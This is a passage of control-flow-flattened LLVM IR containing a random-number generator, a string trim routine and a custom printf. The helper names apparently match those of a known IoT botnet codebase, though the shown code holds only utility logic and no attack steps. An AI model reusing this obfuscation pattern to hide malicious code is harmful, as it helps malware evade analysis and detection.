  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = load i32, i32* %3, align 4
  %21 = sub nsw i32 %20, 2
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = xor i32 %19, %24
  %26 = xor i32 %25, -1640531527
  %27 = load i32, i32* %3, align 4
  %28 = xor i32 %26, %27
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  store i32 %28, i32* %31, align 4
  store i32 -962537515, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %3, align 4
  store i32 -256873012, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 -1658717718, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1658717718, label %first
    i32 -1853745668, label %30
    i32 -237318374, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %28 = icmp ult i32 %.reload, %.reload3
  %29 = select i1 %28, i32 -1853745668, i32 -237318374
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1
  store i32 %32, i32* %3, align 4
  %33 = load i32, i32* @c, align 4
  %34 = add i32 %33, 1
  store i32 %34, i32* @c, align 4
  store i32 -237318374, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %4, align 4
  %37 = load i32, i32* %3, align 4
  %38 = sub i32 %36, %37
  %39 = load i32, i32* @rand_cmwc.i, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  store i32 %38, i32* %41, align 4
  ret i32 %38

loopEnd:                                          ; preds = %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -1762181451, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1762181451, label %10
    i32 -716979272, label %20
    i32 -240859658, label %23
    i32 1563624420, label %24
    i32 -1206624281, label %29
    i32 416730502, label %38
    i32 2014450139, label %40
    i32 523484530, label %43
    i32 -771492988, label %45
    i32 254034553, label %50
    i32 723234894, label %62
    i32 -328749141, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  %19 = select i1 %18, i32 -716979272, i32 -240859658
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %4, align 4
  store i32 -1762181451, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 1563624420, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %5, align 4
  %26 = load i32, i32* %4, align 4
  %27 = icmp sge i32 %25, %26
  %28 = select i1 %27, i32 -1206624281, i32 416730502
  store i32 %28, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = call i32 @isspace(i32 %35) #10
  %37 = icmp ne i32 %36, 0
  store i32 416730502, i32* %switchVar
  store i1 %37, i1* %.reg2mem
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %39 = select i1 %.reload, i32 2014450139, i32 523484530
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, -1
  store i32 %42, i32* %5, align 4
  store i32 1563624420, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %3, align 4
  store i32 -771492988, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp sle i32 %46, %47
  %49 = select i1 %48, i32 254034553, i32 -328749141
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %2, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = load i32, i32* %4, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %56, i64 %60
  store i8 %55, i8* %61, align 1
  store i32 723234894, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %3, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %3, align 4
  store i32 -771492988, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8*, i8** %2, align 8
  %67 = load i32, i32* %3, align 4
  %68 = load i32, i32* %4, align 4
  %69 = sub nsw i32 %67, %68
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %66, i64 %70
  store i8 0, i8* %71, align 1
  ret void

loopEnd:                                          ; preds = %62, %50, %45, %43, %40, %38, %29, %24, %23, %20, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %.reg2mem72 = alloca i32
  %.reg2mem69 = alloca i32*
  %.reg2mem65 = alloca %struct.__va_list_tag*
  %.reg2mem61 = alloca i32
  %.reg2mem58 = alloca i32*
  %.reg2mem54 = alloca %struct.__va_list_tag*
  %.reg2mem52 = alloca i8**
  %.reg2mem48 = alloca i32
  %.reg2mem45 = alloca i32*
  %.reg2mem41 = alloca %struct.__va_list_tag*
  %.reg2mem39 = alloca i8**
  %.reg2mem35 = alloca i32
  %.reg2mem32 = alloca i32*
  %.reg2mem28 = alloca %struct.__va_list_tag*
  %.reg2mem26 = alloca i8**
  %.reg2mem22 = alloca i32
  %.reg2mem19 = alloca i32*
  %.reg2mem15 = alloca %struct.__va_list_tag*
  %.reg2mem13 = alloca i8**
  %.reg2mem11 = alloca i8**
  %.reg2mem7 = alloca i32
  %.reg2mem4 = alloca i32*
  %.reg2mem = alloca %struct.__va_list_tag*
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  %switchVar = alloca i32
  store i32 -1592429487, i32* %switchVar
  %.reg2mem76 = alloca i1
  %.reg2mem78 = alloca i32*
  %.reg2mem80 = alloca i8*
  %.reg2mem82 = alloca i32*
  %.reg2mem84 = alloca i32*
  %.reg2mem86 = alloca i32*
  %.reg2mem88 = alloca i32*
  %.reg2mem90 = alloca i32*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1592429487, label %12
    i32 2067871769, label %18
    i32 -1096149060, label %24
    i32 1909944726, label %32
    i32 725583623, label %33
    i32 -1635732940, label %39
    i32 -1880697948, label %40
    i32 780682398, label %46
    i32 1039763369, label %49
    i32 -1626458071, label %50
    i32 1285119362, label %56
    i32 765399993, label %61
    i32 804549549, label %62
    i32 -2042506922, label %68
    i32 -1357985217, label %73
    i32 -1913317662, label %75
    i32 590065131, label %84
    i32 -2060290800, label %87
    i32 2041370099, label %93
    i32 -2039879616, label %99
    i32 -1302205210, label %105
    i32 -330085864, label %110
    i32 302263574, label %118
    i32 -70339957, label %120
    i32 -224166351, label %121
    i32 238820272, label %127
    i32 -1917131350, label %133
    i32 -416850340, label %140
    i32 2111250351, label %146
    i32 1276369535, label %151
    i32 -949406776, label %158
    i32 -304190941, label %164
    i32 499045052, label %171
    i32 587076418, label %177
    i32 -436056397, label %182
    i32 -1916097699, label %189
    i32 -1448963681, label %195
    i32 1239438813, label %202
    i32 -959969552, label %208
    i32 617024439, label %213
    i32 1614428834, label %220
    i32 1698354896, label %226
    i32 1471046505, label %233
    i32 337046118, label %239
    i32 -1450347682, label %244
    i32 -482398601, label %251
    i32 -85177826, label %257
    i32 -2128302247, label %263
    i32 146609411, label %269
    i32 559408698, label %274
    i32 1753529743, label %286
    i32 -565675644, label %287
    i32 889123824, label %288
    i32 -1310415813, label %295
    i32 1293602315, label %296
    i32 578524091, label %299
    i32 -10108259, label %303
    i32 165995473, label %306
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  %17 = select i1 %16, i32 2067871769, i32 578524091
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %5, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 37
  %23 = select i1 %22, i32 -1096149060, i32 -565675644
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %5, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %27 = load i8*, i8** %5, align 8
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 1909944726, i32 725583623
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 578524091, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  %38 = select i1 %37, i32 -1635732940, i32 -1880697948
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 889123824, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 45
  %45 = select i1 %44, i32 780682398, i32 1039763369
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %5, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %5, align 8
  store i32 1, i32* %8, align 4
  store i32 1039763369, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 -1626458071, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %5, align 8
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 48
  %55 = select i1 %54, i32 1285119362, i32 765399993
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8*, i8** %5, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %5, align 8
  %59 = load i32, i32* %8, align 4
  %60 = or i32 %59, 2
  store i32 %60, i32* %8, align 4
  store i32 -1626458071, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 804549549, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp sge i32 %65, 48
  %67 = select i1 %66, i32 -2042506922, i32 -1357985217
  store i32 %67, i32* %switchVar
  store i1 false, i1* %.reg2mem76
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 57
  store i32 -1357985217, i32* %switchVar
  store i1 %72, i1* %.reg2mem76
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %.reload77 = load i1, i1* %.reg2mem76
  %74 = select i1 %.reload77, i32 -1913317662, i32 -2060290800
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %7, align 4
  %77 = mul nsw i32 %76, 10
  store i32 %77, i32* %7, align 4
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = sub nsw i32 %80, 48
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  store i32 590065131, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %5, align 8
  store i32 804549549, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %5, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 115
  %92 = select i1 %91, i32 2041370099, i32 238820272
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %94, %struct.__va_list_tag** %.reg2mem
  %.reload3 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload3, i32 0, i32 0
  store i32* %95, i32** %.reg2mem4
  %.reload6 = load volatile i32*, i32** %.reg2mem4
  %96 = load i32, i32* %.reload6, align 8
  store i32 %96, i32* %.reg2mem7
  %.reload10 = load volatile i32, i32* %.reg2mem7
  %97 = icmp ule i32 %.reload10, 40
  %98 = select i1 %97, i32 -2039879616, i32 -1302205210
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %.reload2 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload2, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %.reload9 = load volatile i32, i32* %.reg2mem7
  %102 = getelementptr i8, i8* %101, i32 %.reload9
  %103 = bitcast i8* %102 to i32*
  %.reload8 = load volatile i32, i32* %.reg2mem7
  %104 = add i32 %.reload8, 8
  %.reload5 = load volatile i32*, i32** %.reg2mem4
  store i32 %104, i32* %.reload5, align 8
  store i32 -330085864, i32* %switchVar
  store i32* %103, i32** %.reg2mem78
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %.reload = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %106 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload, i32 0, i32 2
  %107 = load i8*, i8** %106, align 8
  %108 = bitcast i8* %107 to i32*
  %109 = getelementptr i8, i8* %107, i32 8
  store i8* %109, i8** %106, align 8
  store i32 -330085864, i32* %switchVar
  store i32* %108, i32** %.reg2mem78
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %.reload79 = load i32*, i32** %.reg2mem78
  %111 = load i32, i32* %.reload79, align 4
  %112 = sext i32 %111 to i64
  %113 = inttoptr i64 %112 to i8*
  store i8* %113, i8** %11, align 8
  %114 = load i8**, i8*** %4, align 8
  store i8** %114, i8*** %.reg2mem11
  %115 = load i8*, i8** %11, align 8
  %116 = icmp ne i8* %115, null
  %117 = select i1 %116, i32 302263574, i32 -70339957
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i8*, i8** %11, align 8
  store i32 -224166351, i32* %switchVar
  store i8* %119, i8** %.reg2mem80
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 -224166351, i32* %switchVar
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.423, i32 0, i32 0), i8** %.reg2mem80
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %.reload81 = load i8*, i8** %.reg2mem80
  %122 = load i32, i32* %7, align 4
  %123 = load i32, i32* %8, align 4
  %.reload12 = load volatile i8**, i8*** %.reg2mem11
  %124 = call i32 @prints(i8** %.reload12, i8* %.reload81, i32 %122, i32 %123)
  %125 = load i32, i32* %9, align 4
  %126 = add nsw i32 %125, %124
  store i32 %126, i32* %9, align 4
  store i32 1293602315, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8*, i8** %5, align 8
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 100
  %132 = select i1 %131, i32 -1917131350, i32 -949406776
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i8**, i8*** %4, align 8
  store i8** %134, i8*** %.reg2mem13
  %135 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %135, %struct.__va_list_tag** %.reg2mem15
  %.reload18 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %136 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload18, i32 0, i32 0
  store i32* %136, i32** %.reg2mem19
  %.reload21 = load volatile i32*, i32** %.reg2mem19
  %137 = load i32, i32* %.reload21, align 8
  store i32 %137, i32* %.reg2mem22
  %.reload25 = load volatile i32, i32* %.reg2mem22
  %138 = icmp ule i32 %.reload25, 40
  %139 = select i1 %138, i32 -416850340, i32 2111250351
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %.reload17 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %141 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload17, i32 0, i32 3
  %142 = load i8*, i8** %141, align 8
  %.reload24 = load volatile i32, i32* %.reg2mem22
  %143 = getelementptr i8, i8* %142, i32 %.reload24
  %144 = bitcast i8* %143 to i32*
  %.reload23 = load volatile i32, i32* %.reg2mem22
  %145 = add i32 %.reload23, 8
  %.reload20 = load volatile i32*, i32** %.reg2mem19
  store i32 %145, i32* %.reload20, align 8
  store i32 1276369535, i32* %switchVar
  store i32* %144, i32** %.reg2mem82
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %.reload16 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %147 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload16, i32 0, i32 2
  %148 = load i8*, i8** %147, align 8
  %149 = bitcast i8* %148 to i32*
  %150 = getelementptr i8, i8* %148, i32 8
  store i8* %150, i8** %147, align 8
  store i32 1276369535, i32* %switchVar
  store i32* %149, i32** %.reg2mem82
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %.reload83 = load i32*, i32** %.reg2mem82
  %152 = load i32, i32* %.reload83, align 4
  %153 = load i32, i32* %7, align 4
  %154 = load i32, i32* %8, align 4
  %.reload14 = load volatile i8**, i8*** %.reg2mem13
  %155 = call i32 @printi(i8** %.reload14, i32 %152, i32 10, i32 1, i32 %153, i32 %154, i32 97)
  %156 = load i32, i32* %9, align 4
  %157 = add nsw i32 %156, %155
  store i32 %157, i32* %9, align 4
  store i32 1293602315, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %5, align 8
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 120
  %163 = select i1 %162, i32 -304190941, i32 -1916097699
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8**, i8*** %4, align 8
  store i8** %165, i8*** %.reg2mem26
  %166 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %166, %struct.__va_list_tag** %.reg2mem28
  %.reload31 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload31, i32 0, i32 0
  store i32* %167, i32** %.reg2mem32
  %.reload34 = load volatile i32*, i32** %.reg2mem32
  %168 = load i32, i32* %.reload34, align 8
  store i32 %168, i32* %.reg2mem35
  %.reload38 = load volatile i32, i32* %.reg2mem35
  %169 = icmp ule i32 %.reload38, 40
  %170 = select i1 %169, i32 499045052, i32 587076418
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %.reload30 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %172 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload30, i32 0, i32 3
  %173 = load i8*, i8** %172, align 8
  %.reload37 = load volatile i32, i32* %.reg2mem35
  %174 = getelementptr i8, i8* %173, i32 %.reload37
  %175 = bitcast i8* %174 to i32*
  %.reload36 = load volatile i32, i32* %.reg2mem35
  %176 = add i32 %.reload36, 8
  %.reload33 = load volatile i32*, i32** %.reg2mem32
  store i32 %176, i32* %.reload33, align 8
  store i32 -436056397, i32* %switchVar
  store i32* %175, i32** %.reg2mem84
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %.reload29 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %178 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload29, i32 0, i32 2
  %179 = load i8*, i8** %178, align 8
  %180 = bitcast i8* %179 to i32*
  %181 = getelementptr i8, i8* %179, i32 8
  store i8* %181, i8** %178, align 8
  store i32 -436056397, i32* %switchVar
  store i32* %180, i32** %.reg2mem84
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %.reload85 = load i32*, i32** %.reg2mem84
  %183 = load i32, i32* %.reload85, align 4
  %184 = load i32, i32* %7, align 4
  %185 = load i32, i32* %8, align 4
  %.reload27 = load volatile i8**, i8*** %.reg2mem26
  %186 = call i32 @printi(i8** %.reload27, i32 %183, i32 16, i32 0, i32 %184, i32 %185, i32 97)
  %187 = load i32, i32* %9, align 4
  %188 = add nsw i32 %187, %186
  store i32 %188, i32* %9, align 4
  store i32 1293602315, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i8*, i8** %5, align 8
  %191 = load i8, i8* %190, align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 88
  %194 = select i1 %193, i32 -1448963681, i32 1614428834
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8**, i8*** %4, align 8
  store i8** %196, i8*** %.reg2mem39
  %197 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %197, %struct.__va_list_tag** %.reg2mem41
  %.reload44 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %198 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload44, i32 0, i32 0
  store i32* %198, i32** %.reg2mem45
  %.reload47 = load volatile i32*, i32** %.reg2mem45
  %199 = load i32, i32* %.reload47, align 8
  store i32 %199, i32* %.reg2mem48
  %.reload51 = load volatile i32, i32* %.reg2mem48
  %200 = icmp ule i32 %.reload51, 40
  %201 = select i1 %200, i32 1239438813, i32 -959969552
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %.reload43 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %203 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload43, i32 0, i32 3
  %204 = load i8*, i8** %203, align 8
  %.reload50 = load volatile i32, i32* %.reg2mem48
  %205 = getelementptr i8, i8* %204, i32 %.reload50
  %206 = bitcast i8* %205 to i32*
  %.reload49 = load volatile i32, i32* %.reg2mem48
  %207 = add i32 %.reload49, 8
  %.reload46 = load volatile i32*, i32** %.reg2mem45
  store i32 %207, i32* %.reload46, align 8
  store i32 617024439, i32* %switchVar
  store i32* %206, i32** %.reg2mem86
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %.reload42 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %209 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload42, i32 0, i32 2
  %210 = load i8*, i8** %209, align 8
  %211 = bitcast i8* %210 to i32*
  %212 = getelementptr i8, i8* %210, i32 8
  store i8* %212, i8** %209, align 8
  store i32 617024439, i32* %switchVar
  store i32* %211, i32** %.reg2mem86
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %.reload87 = load i32*, i32** %.reg2mem86
  %214 = load i32, i32* %.reload87, align 4
